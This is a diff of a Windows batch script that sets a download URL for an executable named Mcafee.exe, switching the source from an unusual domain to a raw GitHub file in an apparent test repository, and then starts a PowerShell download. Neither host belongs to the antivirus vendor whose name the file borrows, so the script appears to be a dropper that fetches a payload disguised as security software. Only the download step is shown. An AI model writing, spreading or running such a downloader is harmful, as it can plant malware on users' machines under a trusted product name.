@@ -2,7 +2,7 @@
 setlocal
 
 REM Set the download URL and output filename
-set "URL=https://t-bash.space/Mcafee.exe"
+set "URL=https://raw.githubusercontent.com/TestingforMyProj/test/refs/heads/main/Mcafee.exe"
 set "OUTPUT=Mcafee.exe"
 
 REM Download the file using PowerShell
